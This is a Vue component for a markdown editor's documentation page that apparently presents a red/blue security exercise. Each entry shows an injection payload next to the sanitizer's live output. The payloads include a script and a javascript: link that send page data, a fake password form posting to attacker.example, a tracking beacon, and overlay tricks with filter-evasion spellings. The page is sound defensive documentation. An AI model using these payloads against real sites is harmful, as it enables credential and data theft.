<script setup lang="ts">
/**
 * Technical Details: the red/blue exercise, as something a visitor can run.
 *
 * Each attack is a real payload from the November 2026 exercise. The "what the
 * editor keeps" column is not a recording: it is the live output of
 * `renderMarkdown` for that payload in the visitor's own browser.
 */
import { renderMarkdown } from '~/utils/markdown/config'

type Outcome = 'held' | 'fixed' | 'accepted'

interface Attack {
  name: string
  goal: string
  payload: string
  outcome: Outcome
  verdict: string
}

// `</${'script'}>` below: a literal closing tag would end this SFC's own script block.
const attacks: Attack[] = [
  {
    name: 'Run a hidden command',
    goal: 'Make the editor run the attacker’s code as soon as the document is opened: the classic way to steal what someone is working on.',
    payload: `<script>send(document.body.innerText)</${'script'}>\n<a href="javascript:send(localStorage)">Open the report</a>`,
    outcome: 'held',
    verdict: 'The script is removed outright, and the link is left with nowhere to go. Since 1.11.0 the site also tells the browser to refuse any script that did not come with the editor, so this attack would fail even if the filter missed it.',
  },
  {
    name: 'Show a fake sign-in box',
    goal: 'Draw a convincing “your session expired” form inside the editor and collect whatever the author types into it.',
    payload: `<form action="https://attacker.example/collect">\n  Session expired. Password:\n  <input type="password" name="pw">\n  <button>Sign in</button>\n</form>`,
    outcome: 'held',
    verdict: 'Forms, text boxes and buttons are never part of a markdown document, so the editor removes them all. Only the plain words are left.',
  },
  {
    name: 'Cover the whole screen',
    goal: 'Pin a full-screen panel over the editor so the author sees the attacker’s message instead of their own work.',
    payload: `<div style="position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:99999; background:white">\n  This editor has moved. Click here to continue.\n</div>`,
    outcome: 'held',
    verdict: 'The instructions that pin an element over the page are stripped. The text stays where it belongs: inside the preview, in the flow of the document.',
  },
  {
    name: 'Cover the screen, in disguise',
    goal: 'The same attack, with the forbidden word spelled in code: “\\69” is another way to write the letter i, and browsers read it that way.',
    payload: `<div style="pos\\69tion:fixed; z-\\69ndex:99999; top:0; left:0; width:100vw; height:100vh">\n  This editor has moved.\n</div>`,
    outcome: 'fixed',
    verdict: 'This one got past the filter in version 1.9.4. The preview’s second line of defence kept it inside the preview pane, so nothing was covered, but the filter was wrong. It now rejects any styling that uses disguised spelling.',
  },
  {
    name: 'Cover the screen, by reference',
    goal: 'Never write the forbidden word next to the instruction at all. Store it under a nickname and refer to the nickname.',
    payload: `<div style="--where:fixed; position:var(--where); top:0; left:0; width:100vw; height:100vh">\n  This editor has moved.\n</div>`,
    outcome: 'fixed',
    verdict: 'Also got past the old filter. The fix stops looking for forbidden words and instead keeps a short list of the only placements a document may ask for. Anything else is dropped.',
  },
  {
    name: 'Take over the tab you came from',
    goal: 'Offer a link that opens in a new window. While the author reads it, the new page quietly swaps the editor’s tab for a look-alike.',
    payload: `<a href="https://attacker.example" target="report">\n  Open the full report\n</a>`,
    outcome: 'fixed',
    verdict: 'Links that open a new tab were already cut off from the editor. Links that open a named window were not. Every link that opens anywhere else is now cut off, and the site tells the browser to enforce the same rule itself.',
  },
  {
    name: 'Send a read receipt',
    goal: 'Hide a request to the attacker’s server in the document’s styling, so that simply previewing the file reports who opened it, and when.',
    payload: `<div style="background:url(https://attacker.example/opened.png)">\n  Quarterly figures\n</div>`,
    outcome: 'fixed',
    verdict: 'Styling can no longer fetch anything from the internet. One related door is open on purpose: a document can still show an image from a web address, because authors need that. See “What we chose to leave” below.',
  },
  {
    name: 'Show a picture from the web',
    goal: 'Not really an attack: an ordinary image, loaded from a web address. But the server that hosts the picture learns that someone opened the document.',
    payload: `![County map](https://images.example/map.png)`,
    outcome: 'accepted',
    verdict: 'The image is kept. Reports need figures, and figures often live on a web server. The trade-off is explained under “What we chose to leave.”',
  },
  {
    name: 'Repaint the editor',
    goal: 'Ship a stylesheet inside the document that hides the toolbar, or dresses the editor up as something else.',
    payload: `<style>\n  header, .toolbar { display: none }\n  body { background: red }\n</style>`,
    outcome: 'held',
    verdict: 'A document may style its own words. It may not bring a stylesheet, which would apply to the whole application. The block is removed entirely.',
  },
]

const outcomeLabel: Record<Outcome, string> = {
  held: 'Blocked. The defence held.',
  fixed: 'Got through. Fixed in 1.10.0.',
  accepted: 'Allowed on purpose.',
}

const mounted = ref(false)
onMounted(() => { mounted.value = true })

const current = ref(0)
const attack = computed(() => attacks[current.value]!)
const kept = computed(() => {
  if (!mounted.value) return ''
  return renderMarkdown(attack.value.payload)
    .replace(/ data-source-line="\d+"/g, '')
    .trim() || '(nothing at all)'
})
</script>

<template>
  <div class="td-lab">
    <ul class="td-lab-list" aria-label="Attacks to try">
      <li v-for="(a, i) in attacks" :key="a.name">
        <button
          type="button"
          class="td-lab-pick"
          :class="`is-${a.outcome}`"
          :aria-pressed="current === i"
          @click="current = i"
        >
          {{ a.name }}
        </button>
      </li>
    </ul>

    <div class="td-lab-detail" aria-live="polite">
      <h3>{{ attack.name }}</h3>
      <p class="td-lab-goal">{{ attack.goal }}</p>

      <div class="td-lab-sides">
        <div class="td-lab-side is-red">
          <p class="td-pane-label">Red team sends</p>
          <pre class="td-code" tabindex="0" role="group" aria-label="The attack"><code>{{ attack.payload }}</code></pre>
        </div>
        <div class="td-lab-side is-blue">
          <p class="td-pane-label">The editor keeps</p>
          <pre class="td-code" tabindex="0" role="group" aria-label="What is left after sanitizing"><code>{{ kept }}</code></pre>
        </div>
      </div>

      <p class="td-lab-verdict" :class="`is-${attack.outcome}`">
        <strong>{{ outcomeLabel[attack.outcome] }}</strong> {{ attack.verdict }}
      </p>
    </div>
  </div>
</template>
